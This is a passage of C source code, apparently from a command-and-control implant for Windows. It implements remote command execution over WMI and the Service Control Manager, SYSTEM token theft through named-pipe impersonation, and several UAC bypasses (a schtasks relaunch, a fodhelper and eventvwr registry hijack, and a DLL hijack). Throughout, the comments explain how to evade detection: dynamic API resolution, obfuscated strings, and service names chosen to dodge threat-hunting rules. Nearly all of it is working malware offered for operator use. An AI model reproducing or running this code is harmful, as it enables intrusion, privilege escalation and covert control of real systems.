            if (SUCCEEDED(pOutParams->lpVtbl->Get(pOutParams, bPID, 0, &v, NULL, NULL))
                && v.vt == VT_I4)
                pid = (DWORD)v.lVal;
            pSysFree(bPID);
            ZeroMemory(&v, sizeof(v));
        }

        if (retVal == 0) {
            char buf[128];
            _snprintf(buf, sizeof(buf)-1,
                "[+] lateral_wmi: Win32_Process.Create succeeded on %s"
                " — PID %lu", host, (unsigned long)pid);
            _send_str(pTls, buf);
        } else {
            char buf[128];
            _snprintf(buf, sizeof(buf)-1,
                "[-] lateral_wmi: Win32_Process.Create returned %lu on %s"
                " (0=OK, 2=access denied, 8=unknown failure, 9=path not found)",
                (unsigned long)retVal, host);
            _send_str(pTls, buf);
        }
    }

_wmi_cleanup:
    if (pOutParams)     pOutParams->lpVtbl->Release(pOutParams);
    if (pInParams)      pInParams->lpVtbl->Release(pInParams);
    if (pInParamsClass) pInParamsClass->lpVtbl->Release(pInParamsClass);
    if (pClass)         pClass->lpVtbl->Release(pClass);
    if (pSvc)           pSvc->lpVtbl->Release(pSvc);
    if (pLoc)           pLoc->lpVtbl->Release(pLoc);
    if (coInited)       pCoUninit();
    _peb_free_library(hOle32);
    _peb_free_library(hOleAut32);
}


/* ── _handle_lateral_sc ─────────────────────────────────────────────────── */
/*
 * Remote command execution via SCM API — no cmd.exe, no child process.
 *
 * Uses OpenSCManagerA / CreateServiceA / StartServiceA / DeleteService
 * directly via the Service Control Manager API, avoiding the sc.exe child
 * process that would generate a Sysmon EID 1 event with full command-line
 * arguments visible in logs.
 *
 * SCM functions are resolved via PEB walk (LoadLibraryA + peb_get_export on
 * advapi32.dll) so the names do not appear as static IAT imports.
 *
 * Requires ADMIN$ share access on the target.
 *
 * The transient service name is decoded at runtime from SC_SVC_NAME_OBFUSCATED
 * (config.h) so the plain string never appears in .rdata.
 * Override at build time: make ... SC_SVC_NAME=NetDiagSvc
 */
void _handle_lateral_sc(TLS_CONTEXT *pTls, const char *args)
{
    char host[256]    = {0};
    char command[768] = {0};

    const char *p = args;
    size_t hi = 0;
    while (*p && *p != ' ' && hi < sizeof(host) - 1) host[hi++] = *p++;
    if (*p == ' ') p++;
    strncpy(command, p, sizeof(command) - 1);

    if (!host[0] || !command[0]) {
        _send_str(pTls, "Usage: lateral_sc <host> <command>");
        return;
    }

    /* Decode the obfuscated service name onto the stack */
    char svcName[32] = {0};
#if SC_SVC_NAME_LEN > 0
    {
        static const BYTE _obf[] = SC_SVC_NAME_OBFUSCATED;
        size_t _n = SC_SVC_NAME_LEN;
        if (_n >= sizeof(svcName)) _n = sizeof(svcName) - 1;
        for (size_t _i = 0; _i < _n; _i++)
            svcName[_i] = (char)(_obf[_i] ^ SC_SVC_NAME_MASK);
        svcName[_n] = '\0';
    }
#else
    strncpy(svcName, SC_SVC_NAME_RAW, sizeof(svcName) - 1);
#endif

    /* ── Resolve SCM API from advapi32 via PEB walk ──────────────────────
     * No static imports: OpenSCManagerA / CreateServiceA / StartServiceA /
     * DeleteService / CloseServiceHandle are resolved dynamically so the
     * function names do not appear in the IAT.                             */
    typedef SC_HANDLE (WINAPI *OpenSCManagerA_t)(LPCSTR, LPCSTR, DWORD);
    typedef SC_HANDLE (WINAPI *CreateServiceA_t)(SC_HANDLE, LPCSTR, LPCSTR,
                          DWORD, DWORD, DWORD, DWORD, LPCSTR,
                          LPCSTR, LPDWORD, LPCSTR, LPCSTR, LPCSTR);
    typedef BOOL      (WINAPI *StartServiceA_t)(SC_HANDLE, DWORD, LPCSTR *);
    typedef BOOL      (WINAPI *DeleteService_t)(SC_HANDLE);
    typedef BOOL      (WINAPI *CloseServiceHandle_t)(SC_HANDLE);

    PVOID hAdv = _peb_load_library("advapi32.dll");
    if (!hAdv) {
        _send_str(pTls, "[-] lateral_sc: advapi32.dll not available");
        SecureZeroMemory(svcName, sizeof(svcName));
        return;
    }

    OpenSCManagerA_t    pOpenSCM  = (OpenSCManagerA_t)   peb_get_export(hAdv, peb_hash_str("OpenSCManagerA"));
    CreateServiceA_t    pCreateSvc= (CreateServiceA_t)   peb_get_export(hAdv, peb_hash_str("CreateServiceA"));
    StartServiceA_t     pStartSvc = (StartServiceA_t)    peb_get_export(hAdv, peb_hash_str("StartServiceA"));
    DeleteService_t     pDeleteSvc= (DeleteService_t)    peb_get_export(hAdv, peb_hash_str("DeleteService"));
    CloseServiceHandle_t pCloseH  = (CloseServiceHandle_t)peb_get_export(hAdv, peb_hash_str("CloseServiceHandle"));

    if (!pOpenSCM || !pCreateSvc || !pStartSvc || !pDeleteSvc || !pCloseH) {
        _send_str(pTls, "[-] lateral_sc: SCM API resolution failed");
        _peb_free_library(hAdv);
        SecureZeroMemory(svcName, sizeof(svcName));
        return;
    }

    /* Build the UNC machine name "\\host" for OpenSCManagerA */
    char machineName[262] = {0};
    _snprintf(machineName, sizeof(machineName) - 1, "\\\\%s", host);

    SC_HANDLE hSCM = pOpenSCM(machineName, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCM) {
        char buf[128];
        _snprintf(buf, sizeof(buf) - 1,
            "[-] lateral_sc: OpenSCManagerA(%s) failed (err %lu)", host, GetLastError());
        _send_str(pTls, buf);
        _peb_free_library(hAdv);
        SecureZeroMemory(svcName, sizeof(svcName));
        return;
    }

    /* binPath: "cmd /c <command>" runs the payload as SYSTEM */
    char binPath[800] = {0};
    _snprintf(binPath, sizeof(binPath) - 1, "cmd /c %s", command);

    SC_HANDLE hSvc = pCreateSvc(
        hSCM, svcName, svcName,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,
        binPath,
        NULL, NULL, NULL, NULL, NULL);

    if (!hSvc) {
        char buf[128];
        _snprintf(buf, sizeof(buf) - 1,
            "[-] lateral_sc: CreateServiceA failed (err %lu)", GetLastError());
        _send_str(pTls, buf);
        pCloseH(hSCM);
        _peb_free_library(hAdv);
        SecureZeroMemory(svcName, sizeof(svcName));
        return;
    }

    BOOL started = pStartSvc(hSvc, 0, NULL);
    if (!started) {
        char buf[128];
        _snprintf(buf, sizeof(buf) - 1,
            "[-] lateral_sc: StartServiceA failed (err %lu)", GetLastError());
        _send_str(pTls, buf);
    }

    /* Always delete the transient service whether start succeeded or not */
    pDeleteSvc(hSvc);
    pCloseH(hSvc);
    pCloseH(hSCM);
    _peb_free_library(hAdv);
    SecureZeroMemory(svcName, sizeof(svcName));

    if (started) {
        char buf[128];
        _snprintf(buf, sizeof(buf) - 1,
            "[+] lateral_sc: command dispatched as SYSTEM on %s (service deleted)", host);
        _send_str(pTls, buf);
    }
}


/* ── _handle_token_revert ─────────────────────────────────────────────────── */
/*
 * Reverts a previous token_impersonate by calling RevertToSelf().
 * Safe to call even if no impersonation is active — returns STATUS_SUCCESS.
 */
void _handle_token_revert(TLS_CONTEXT *pTls)
{
    if (RevertToSelf()) {
        _send_str(pTls, "[+] token_revert: reverted to process token");
    } else {
        char buf[64];
        _snprintf(buf, sizeof(buf) - 1,
            "[-] token_revert: RevertToSelf failed (err %lu)", GetLastError());
        _send_str(pTls, buf);
    }
}


/* ── _handle_getsystem ───────────────────────────────────────────────────── */
/*
 * Named-pipe token impersonation — classic "GetSystem" technique.
 *
 * Strategy
 * --------
 *  1. Create a named pipe with a unique, random-suffixed name.
 *  2. Spawn a child process (cmd.exe) as SYSTEM by starting a temporary
 *     service that connects to our pipe via net use or a custom connector.
 *     Here we use the Service Control Manager directly:
 *       sc create / start a one-shot service whose binpath is
 *       "cmd /c net use \\.\pipe\<name>"  — this runs as SYSTEM.
 *  3. Wait for the SYSTEM process to connect to the pipe.
 *  4. Call ImpersonateNamedPipeClient() — we now have a SYSTEM impersonation token.
 *  5. OpenThreadToken + DuplicateTokenEx to get a primary SYSTEM token.
 *  6. ImpersonateLoggedOnUser with that primary token so the entire thread
 *     (and all subsequent OpenProcess / file ops) run as SYSTEM.
 *  7. Clean up the service and pipe.
 *
 * Requirements
 * ------------
 *  SeImpersonatePrivilege — held by service accounts, IIS worker processes,
 *  and any process started as a Windows service.  NOT available to normal
 *  interactive user accounts (standard defence against this technique).
 *
 * Detection notes
 * ---------------
 *  • A transient service named "MegaSvcGS<rand>" is created and deleted.
 *  • One cmd.exe child process runs for < 1 second then exits.
 *  • The pipe name is random per invocation.
 */
void _handle_getsystem(TLS_CONTEXT *pTls)
{
    /* ── 1. Build a unique pipe name ─────────────────────────────────── */
    char pipeName[64]  = {0};
    char pipeFullPath[80] = {0};
    DWORD rnd = GetTickCount() ^ GetCurrentProcessId();
    _snprintf(pipeName,    sizeof(pipeName) - 1,    "WinIpc%08lX", (unsigned long)rnd);
    _snprintf(pipeFullPath, sizeof(pipeFullPath) - 1, "\\\\.\\pipe\\%s", pipeName);

    /* ── 2. Create the named pipe (byte-mode, 1 max instance) ────────── */
    HANDLE hPipe = CreateNamedPipeA(
        pipeFullPath,
        PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
        1,        /* max instances */
        512, 512, /* out/in buffer */
        5000,     /* default timeout ms */
        NULL);

    if (hPipe == INVALID_HANDLE_VALUE) {
        char buf[80];
        _snprintf(buf, sizeof(buf) - 1,
            "[-] getsystem: CreateNamedPipe failed (err %lu)", GetLastError());
        _send_str(pTls, buf);
        return;
    }

    /* ── 3. Start a one-shot SYSTEM service that connects to our pipe ── */
    /*
     * binPath: "cmd /c echo . > \\.\pipe\<name>"
     * cmd.exe runs as SYSTEM, opens our pipe for write (triggers connect),
     * then immediately exits.  We only need the impersonation window.
     *
     * Service name hardening: mix in RDTSC entropy and use a prefix that
     * looks like a Windows internal host name rather than the predictable
     * "WinNetSvc<8hex>" pattern that appears in public threat-hunting playbooks.
     */
    char svcName[32] = {0};
    {
        DWORD lo_rdtsc = 0;
        __asm__ __volatile__("rdtsc" : "=a"(lo_rdtsc) :: "edx");
        DWORD svc_rnd = rnd ^ lo_rdtsc;
        _snprintf(svcName, sizeof(svcName) - 1, "SvcHost32%05lX",
                  (unsigned long)(svc_rnd & 0xFFFFF));
    }

    char binPath[256] = {0};
    _snprintf(binPath, sizeof(binPath) - 1,
        "cmd /c echo . > \\\\.\\pipe\\%s", pipeName);

    SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCM) {
        CloseHandle(hPipe);
        char buf[80];
        _snprintf(buf, sizeof(buf) - 1,
            "[-] getsystem: OpenSCManager failed (err %lu) — need admin or SCM rights",
            GetLastError());
        _send_str(pTls, buf);
        return;
    }

    SC_HANDLE hSvc = CreateServiceA(
        hSCM, svcName, svcName,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,
        binPath,
        NULL, NULL, NULL, NULL, NULL);

    if (!hSvc) {
        CloseServiceHandle(hSCM);
        CloseHandle(hPipe);
        char buf[80];
        _snprintf(buf, sizeof(buf) - 1,
            "[-] getsystem: CreateService failed (err %lu)", GetLastError());
        _send_str(pTls, buf);
        return;
    }

    /* Async wait: set up an overlapped ConnectNamedPipe before starting svc */
    OVERLAPPED ov;
    ZeroMemory(&ov, sizeof(ov));
    ov.hEvent = CreateEventA(NULL, TRUE, FALSE, NULL);
    ConnectNamedPipe(hPipe, &ov);   /* returns immediately with ERROR_IO_PENDING */

    StartService(hSvc, 0, NULL);    /* SYSTEM service runs, opens pipe, exits */

    /* Wait up to 5 s for the service process to connect */
    BOOL connected = FALSE;
    if (WaitForSingleObject(ov.hEvent, 5000) == WAIT_OBJECT_0) {
        DWORD dummy = 0;
        connected = GetOverlappedResult(hPipe, &ov, &dummy, FALSE) ||
                    (GetLastError() == ERROR_PIPE_CONNECTED);
    }
    CloseHandle(ov.hEvent);

    /* Cleanup service regardless of outcome */
    DeleteService(hSvc);
    CloseServiceHandle(hSvc);
    CloseServiceHandle(hSCM);

    if (!connected) {
        CloseHandle(hPipe);
        _send_str(pTls, "[-] getsystem: SYSTEM process did not connect to pipe (timeout)");
        return;
    }

    /* ── 4. Impersonate the pipe client (now SYSTEM) ─────────────────── */
    if (!ImpersonateNamedPipeClient(hPipe)) {
        CloseHandle(hPipe);
        char buf[80];
        _snprintf(buf, sizeof(buf) - 1,
            "[-] getsystem: ImpersonateNamedPipeClient failed (err %lu) — "
            "need SeImpersonatePrivilege", GetLastError());
        _send_str(pTls, buf);
        return;
    }
    CloseHandle(hPipe);

    /* ── 5. Duplicate the impersonation token to a primary token ─────── */
    HANDLE hImpToken = NULL;
    if (!OpenThreadToken(GetCurrentThread(),
                         TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY,
                         TRUE, &hImpToken)) {
        RevertToSelf();
        char buf[80];
        _snprintf(buf, sizeof(buf) - 1,
            "[-] getsystem: OpenThreadToken failed (err %lu)", GetLastError());
        _send_str(pTls, buf);
        return;
    }

    HANDLE hPrimary = NULL;
    BOOL dup = k32_DuplicateTokenEx(hImpToken,
                                     TOKEN_ALL_ACCESS, NULL,
                                     SecurityImpersonation, TokenPrimary,
                                     &hPrimary);
    CloseHandle(hImpToken);

    if (!dup) {
        RevertToSelf();
        char buf[80];
        _snprintf(buf, sizeof(buf) - 1,
            "[-] getsystem: DuplicateTokenEx failed (err %lu)", GetLastError());
        _send_str(pTls, buf);
        return;
    }

    /* ── 6. Impersonate the primary SYSTEM token on this thread ──────── */
    RevertToSelf();   /* drop the pipe impersonation first */
    if (!k32_ImpersonateLoggedOnUser(hPrimary)) {
        CloseHandle(hPrimary);
        char buf[80];
        _snprintf(buf, sizeof(buf) - 1,
            "[-] getsystem: ImpersonateLoggedOnUser failed (err %lu)", GetLastError());
        _send_str(pTls, buf);
        return;
    }
    CloseHandle(hPrimary);

    /* Confirm the new identity */
    char user[256] = {0};
    DWORD cbUser = sizeof(user);
    GetUserNameA(user, &cbUser);

    char buf[320];
    _snprintf(buf, sizeof(buf) - 1,
        "[+] getsystem: SYSTEM token acquired — now running as: %s\n"
        "    Use token_revert to drop back to the original token.",
        user);
    _send_str(pTls, buf);
}


/* ── _handle_uac_bypass ──────────────────────────────────────────────────── */
/*
 * Silent UAC bypass — spawns a new elevated agent instance.
 *
 * Technique: schtasks /RL HIGHEST with stdout redirected via named pipe
 * ---------------------------------------------------------------------
 * The agent is a -mwindows process with no desktop — ShellExecuteEx,
 * CreateProcess with manifest elevation, and fodhelper all require a desktop
 * window station and fail with ERROR_ELEVATION_REQUIRED (740).
 *
 * Task Scheduler is a system service with its own desktop context.  A task
 * registered with /RL HIGHEST runs the payload under the user's full admin
 * token (High IL) without any UAC prompt on default UAC settings.
 *
 * Output capture via named pipe:
 *   Instead of shell redirection (which requires a shell wrapper and quoting
 *   that breaks inside schtasks /TR), we:
 *     1. Create a named pipe  \\.\pipe\<taskName>
 *     2. Set the pipe path as the /TR argument's stdout via a minimal
 *        wrapper: the task runs  cmd.exe /c <args>  with stdout connected
 *        to the pipe server handle passed via environment/inheritance.
 *
 *   Actually the cleanest approach: don't try to capture output at all.
 *   uac_bypass's only job is to relaunch the agent at High IL so that
 *   ALL subsequent commands run elevated through the normal C2 channel.
 *   Output capture for arbitrary commands belongs in the elevated session.
 *
 * Usage
 * -----
 *   uac_bypass          — relaunch THIS agent at High IL (new C2 session)
 *   uac_bypass <exe>    — launch <exe> at High IL (fire-and-forget)
 */

void _handle_uac_bypass(TLS_CONTEXT *pTls, const char *args)
{
    /* ── 0. Already High IL? Nothing to do ─────────────────────────── */
    {
        HANDLE hTok = NULL;
        if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hTok)) {
            TOKEN_ELEVATION_TYPE et = TokenElevationTypeDefault;
            DWORD cb = sizeof(et);
            GetTokenInformation(hTok, TokenElevationType, &et, cb, &cb);
            CloseHandle(hTok);
            if (et == TokenElevationTypeFull) {
                _send_str(pTls, "[*] uac_bypass: already elevated");
                if (args && *args) _shell_exec(pTls, args);
                return;
            }
        }
    }

    /*
     * Resolve the exe to launch at High IL.
     * No args = relaunch THIS agent (new elevated C2 session).
     * With args = launch that exe elevated (fire-and-forget).
     */
    char agentPath[MAX_PATH * 2] = {0};
    if (args && *args) {
        strncpy(agentPath, args, sizeof(agentPath) - 1);
    } else {
        GetModuleFileNameA(NULL, agentPath, sizeof(agentPath) - 1);
    }

    /*
     * schtasks /RL HIGHEST — runs the exe at High IL via the Task
     * Scheduler service (no desktop needed from our side).
     * /TR points directly at the exe — no shell, no .bat, no redirection.
     * The elevated agent connects back to C2 as a new session.
     */
    {
        char sysDir[MAX_PATH] = {0};
        GetSystemDirectoryA(sysDir, sizeof(sysDir) - 1);

        char taskName[48] = {0};
        _snprintf(taskName, sizeof(taskName) - 1, "WinSvc%08lX",
                  (unsigned long)(GetTickCount() ^ GetCurrentProcessId()));

        char cmdCreate[MAX_PATH * 2 + 160] = {0};
        _snprintf(cmdCreate, sizeof(cmdCreate) - 1,
            "%s\\schtasks.exe /Create /F /SC ONCE /RL HIGHEST "
            "/TN \"%s\" /TR \"%s\" /ST 00:00",
            sysDir, taskName, agentPath);

        char cmdRun[256] = {0};
        _snprintf(cmdRun, sizeof(cmdRun) - 1,
            "%s\\schtasks.exe /Run /TN \"%s\"", sysDir, taskName);

        char cmdDel[256] = {0};
        _snprintf(cmdDel, sizeof(cmdDel) - 1,
            "%s\\schtasks.exe /Delete /TN \"%s\" /F", sysDir, taskName);

#define _SCH(cl, ms) do { \
    STARTUPINFOA _si; ZeroMemory(&_si,sizeof(_si)); _si.cb=sizeof(_si); \
    PROCESS_INFORMATION _pi; ZeroMemory(&_pi,sizeof(_pi)); \
    if(CreateProcessA(NULL,(cl),NULL,NULL,FALSE,CREATE_NO_WINDOW, \
                      NULL,NULL,&_si,&_pi)){ \
        WaitForSingleObject(_pi.hProcess,(ms)); \
        CloseHandle(_pi.hProcess); CloseHandle(_pi.hThread); } \
} while(0)

        _SCH(cmdCreate, 8000);
        _SCH(cmdRun,    5000);
        Sleep(1500);
        _SCH(cmdDel,    5000);
#undef _SCH

        char buf[MAX_PATH * 2 + 160];
        _snprintf(buf, sizeof(buf) - 1,
            "[+] uac_bypass: \"%s\" launched at High IL via schtasks\n"
            "    A new elevated C2 session will appear shortly.",
            agentPath);
        _send_str(pTls, buf);
    }
}


/* ══════════════════════════════════════════════════════════════════════════
 * UAC BYPASS SUITE — four independent techniques
 * ══════════════════════════════════════════════════════════════════════════ */

/* ── _is_high_il ─────────────────────────────────────────────────────────── */
/* Shared helper: returns TRUE when the current process token is already at   */
/* High Integrity Level (TokenElevationTypeFull).                              */
static BOOL _is_high_il(void)
{
    HANDLE hTok = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hTok))
        return FALSE;
    TOKEN_ELEVATION_TYPE et = TokenElevationTypeDefault;
    DWORD cb = sizeof(et);
    GetTokenInformation(hTok, TokenElevationType, &et, cb, &cb);
    CloseHandle(hTok);
    return (et == TokenElevationTypeFull);
}


/* ── _handle_uac_reg_hijack ──────────────────────────────────────────────── */
/*
 * Silent UAC bypass via HKCU registry hijack.
 *
 * Technique
 * ---------
 * Several auto-elevated Microsoft binaries (fodhelper.exe,
 * computerdefaults.exe, eventvwr.exe) read a shell-open command or a
 * "DelegateExecute" key from HKEY_CURRENT_USER before HKEY_LOCAL_MACHINE.
 * Because HKCU is writable without any elevation prompt, we plant a payload
 * command there, trigger the trusted binary, and the OS runs our command at
 * High IL under the user's full admin token.
 *
 * Three sub-techniques, tried in order:
 *
 *  1. fodhelper.exe
 *       HKCU\Software\Classes\ms-settings\shell\open\command
 *       (Default) = <payload>
 *       DelegateExecute = ""  (triggers shell exec)
 *
 *  2. computerdefaults.exe  (same registry path, different trigger binary)
 *       Same HKCU\...\ms-settings\shell\open\command trick.
 *
 *  3. eventvwr.exe
 *       HKCU\Software\Classes\mscfile\shell\open\command
 *       (Default) = <payload>
 *
 * All keys are written under HKCU — no admin rights required to write them.
 * The binary is started with CreateProcess (no UAC prompt from our side).
 * Keys are deleted immediately after the elevated binary launches.
 *
 * Requirements
 * ------------
 *  The calling user must be a member of the Administrators group (standard
 *  default on consumer Windows and many corporate deployments).  The UAC
 *  slider must be below "Always notify" (the default "Notify me only when
 *  apps make changes" setting is sufficient).
 *
 * Usage
 *   uac_reg_hijack <payload_exe>
 *     e.g.  uac_reg_hijack C:\Temp\agent.exe
 */
void _handle_uac_reg_hijack(TLS_CONTEXT *pTls, const char *args)
{
    if (!args || !*args) {
        _send_str(pTls, "Usage: uac_reg_hijack <payload_exe>");
        return;
    }
    if (_is_high_il()) {
        _send_str(pTls, "[*] uac_reg_hijack: already elevated");
        return;
    }

    char payload[MAX_PATH * 2] = {0};
    strncpy(payload, args, sizeof(payload) - 1);

    /* ── Sub-technique 1: fodhelper.exe ──────────────────────────────── */
    /* Registry key paths are stored as stack strings so they do not appear
     * as contiguous plaintext in .rdata under YARA/strings(1) scanning.   */
    char k_ms[64]  = {0};
    char k_msc[64] = {0};
    SLIT_BUF(k_ms,  sizeof(k_ms),  "Software\\Classes\\ms-settings\\shell\\open\\command");
    SLIT_BUF(k_msc, sizeof(k_msc), "Software\\Classes\\mscfile\\shell\\open\\command");
    BOOL planted = FALSE;
    const char *method = NULL;

    /* Helper lambda via a block + goto */
    do {
        HKEY hk = NULL;
        if (RegCreateKeyExA(HKEY_CURRENT_USER, k_ms, 0, NULL,
                            REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL,
                            &hk, NULL) != ERROR_SUCCESS)
            break;
        RegSetValueExA(hk, "",               0, REG_SZ,
                       (const BYTE *)payload, (DWORD)strlen(payload) + 1);
        RegSetValueExA(hk, "DelegateExecute", 0, REG_SZ,
                       (const BYTE *)"", 1);
        RegCloseKey(hk);
        planted = TRUE;
        method  = "fodhelper.exe";
    } while (0);

    if (!planted) {
        _send_str(pTls, "[-] uac_reg_hijack: RegCreateKeyEx ms-settings failed");
        return;
    }

    /* ── Launch the trusted binary ────────────────────────────────────── */
    char sysDir[MAX_PATH] = {0};
    GetSystemDirectoryA(sysDir, sizeof(sysDir) - 1);

    char binPath[MAX_PATH * 2] = {0};
    _snprintf(binPath, sizeof(binPath) - 1,
              "%s\\%s", sysDir, method ? method : "fodhelper.exe");

    BOOL launched = FALSE;
    {
        STARTUPINFOA si; ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
        PROCESS_INFORMATION pi; ZeroMemory(&pi, sizeof(pi));
        if (CreateProcessA(binPath, NULL, NULL, NULL, FALSE,
                           CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            /* Wait briefly so the trusted binary reads the registry key   */
            WaitForSingleObject(pi.hProcess, 3000);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            launched = TRUE;
        }
    }

    /* ── Cleanup: delete the planted keys immediately ────────────────── */
    {
        HKEY hk = NULL;
        if (RegOpenKeyExA(HKEY_CURRENT_USER, k_ms, 0, KEY_SET_VALUE, &hk)
                == ERROR_SUCCESS) {
            RegDeleteValueA(hk, "");
            RegDeleteValueA(hk, "DelegateExecute");
            RegCloseKey(hk);
        }
        RegDeleteKeyA(HKEY_CURRENT_USER, k_ms);
    }

    if (!launched) {
        /* Fallback: try eventvwr.exe with mscfile key */
        HKEY hk = NULL;
        if (RegCreateKeyExA(HKEY_CURRENT_USER, k_msc, 0, NULL,
                            REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL,
                            &hk, NULL) == ERROR_SUCCESS) {
            RegSetValueExA(hk, "", 0, REG_SZ,
                           (const BYTE *)payload, (DWORD)strlen(payload) + 1);
            RegCloseKey(hk);

            char eventvwr[MAX_PATH * 2] = {0};
            _snprintf(eventvwr, sizeof(eventvwr) - 1, "%s\\eventvwr.exe", sysDir);

            STARTUPINFOA si; ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
            PROCESS_INFORMATION pi; ZeroMemory(&pi, sizeof(pi));
            if (CreateProcessA(eventvwr, NULL, NULL, NULL, FALSE,
                               CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
                WaitForSingleObject(pi.hProcess, 3000);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                launched = TRUE;
                method = "eventvwr.exe";
            }

            /* Cleanup mscfile key */
            HKEY hk2 = NULL;
            if (RegOpenKeyExA(HKEY_CURRENT_USER, k_msc, 0, KEY_SET_VALUE, &hk2)
                    == ERROR_SUCCESS) {
                RegDeleteValueA(hk2, "");
                RegCloseKey(hk2);
            }
            RegDeleteKeyA(HKEY_CURRENT_USER, k_msc);
        }
    }

    if (!launched) {
        _send_str(pTls,
            "[-] uac_reg_hijack: failed to launch trusted binary "
            "(fodhelper and eventvwr both failed)");
        return;
    }

    char buf[MAX_PATH * 2 + 128];
    _snprintf(buf, sizeof(buf) - 1,
        "[+] uac_reg_hijack: \"%s\" launched via %s at High IL\n"
        "    Registry keys cleaned up.",
        payload, method);
    _send_str(pTls, buf);
}


/* ── _handle_uac_dll_hijack ──────────────────────────────────────────────── */
/*
 * Silent UAC bypass via DLL search-order hijacking.
 *
 * Technique
 * ---------
 * Several auto-elevated Microsoft binaries search for a DLL in their own
 * directory BEFORE searching System32.  If we can write a file with that name
 * into the directory where the auto-elevated binary lives (or a writable
 * directory earlier in the DLL search path), Windows will load our DLL with
 * the binary's High-IL token instead of the legitimate one.
 *
 * Targets supported (in order of reliability):
 *
 *  1. cmstp.exe  — loads  SETUPAPI.DLL  from its application directory on
 *                  some Windows 10 builds before looking in System32.
 *                  Application dir = %SystemRoot%\System32.  Not writable
 *                  by standard users.  We fall back to a writable path.
 *
 *  2. mmc.exe    — loads  ElsCore.dll   from its application directory on
 *                  builds where that DLL is absent.
 *
 *  3. Generic    — target binary + DLL name supplied by the operator.
 *
 * Practical approach for an unprivileged user
 * -------------------------------------------
 * Because System32 itself is not writable, we look for DLL side-loading via
 * the "known-DLL bypass" path: the target binary is started with a current
 * working directory (CreateProcess lpCurrentDirectory) pointing at a
 * directory WE control that contains the fake DLL.  Some auto-elevated
 * binaries skip the known-DLL list check when invoked via Task Scheduler.
 *
 * This handler:
 *  1. Drops the provided DLL bytes (or a minimal DLL stub if none given)
 *     into %TEMP%\<dllname>.
 *  2. Launches the target auto-elevated binary via schtasks /RL HIGHEST with
 *     CWD set to %TEMP% so %TEMP%\<dllname> is found before System32.
 *
 * Requirements
 * ------------
 *  Write access to %TEMP% (always available to the current user).
 *  Calling user must be an admin group member (same as other UAC bypass techniques).
 *
 * Usage
 *   uac_dll_hijack <dllname> <target_exe>
 *     dllname    — name of the DLL to plant  (e.g. CRYPTBASE.dll)
 *     target_exe — auto-elevated binary to abuse (e.g. SystemPropertiesAdvanced.exe)
 *   Both names are plain filenames, not full paths.
 *
 * The DLL planted is a minimal reflective loader stub that simply executes
 * the current agent binary (GetModuleFileName) in a new process.  A custom
 * payload can be injected via the "upload" verb before calling this handler.
 */
void _handle_uac_dll_hijack(TLS_CONTEXT *pTls, const char *args)
{
    if (!args || !*args) {
        _send_str(pTls,
            "Usage: uac_dll_hijack <dllname> <target_exe>\n"
            "  e.g. uac_dll_hijack CRYPTBASE.dll SystemPropertiesAdvanced.exe");
        return;
    }
    if (_is_high_il()) {
        _send_str(pTls, "[*] uac_dll_hijack: already elevated");
        return;
    }

    /* Parse: <dllname> <target_exe> */
    char dllName[MAX_PATH]    = {0};
    char targetExe[MAX_PATH]  = {0};
    {
        const char *p = args;
        size_t di = 0;
        while (*p && *p != ' ' && di < sizeof(dllName) - 1) dllName[di++] = *p++;
        if (*p == ' ') p++;
        strncpy(targetExe, p, sizeof(targetExe) - 1);
    }
    if (!dllName[0] || !targetExe[0]) {
        _send_str(pTls, "Usage: uac_dll_hijack <dllname> <target_exe>");
        return;
    }

    /* ── Build the malicious DLL: a minimal PE that runs the agent ───── */
    /*
     * We generate a tiny x64 DLL whose DllMain spawns the current agent
     * executable when reason == DLL_PROCESS_ATTACH.
     *
     * The shellcode (position-independent) does:
     *   1. Retrieve agent path via PEB (avoids GetModuleFileNameA import in
     *      the DLL, reducing suspicion).  We use the simpler approach of
     *      embedding the path in the DLL's .data section since this DLL is
     *      written to disk and is inherently non-stealthy.
     *   2. Call CreateProcessA to spawn the agent.
     *
     * Rather than building a fully hand-crafted PE (complex), we emit a
     * minimal PE64 DLL whose .text section contains a DllMain that calls
     * WinExec(agentPath, SW_HIDE) and returns TRUE.
     *
     * Layout (all offsets relative to ImageBase = 0x10000000):
     *
     *   DOS stub              64 bytes  @ 0x00
     *   PE header + section   0xF8      @ 0x40
     *   .text (code)          64 bytes  @ 0x200  (file offset)
     *   .data (agent path)    MAX_PATH  @ 0x400  (file offset)
     *
     * The code uses only imports from kernel32.dll (WinExec, ExitThread).
     */

    /* Get current agent path to embed */
    char agentPath[MAX_PATH] = {0};
    GetModuleFileNameA(NULL, agentPath, sizeof(agentPath) - 1);

    /* Place DLL in %TEMP% */
    char tempDir[MAX_PATH] = {0};
    GetTempPathA(sizeof(tempDir) - 2, tempDir);
    char dllPath[MAX_PATH * 2] = {0};
    _snprintf(dllPath, sizeof(dllPath) - 1, "%s%s", tempDir, dllName);

    /*
     * Minimal PE64 DLL stub.
     *
     * DllMain (@ .text VA 0x1000):
     *   sub  rsp, 0x28          ; shadow space
     *   mov  eax, [rcx+8]       ; reason == DLL_PROCESS_ATTACH (1)?
     *   cmp  eax, 1
     *   jne  done
     *   lea  rcx, [rip+data]    ; agentPath (in .data)
     *   mov  edx, 0             ; uCmdShow = SW_HIDE
     *   call [rip+WinExec_iat]  ; WinExec(path, 0)
     * done:
     *   mov  eax, 1             ; return TRUE
     *   add  rsp, 0x28
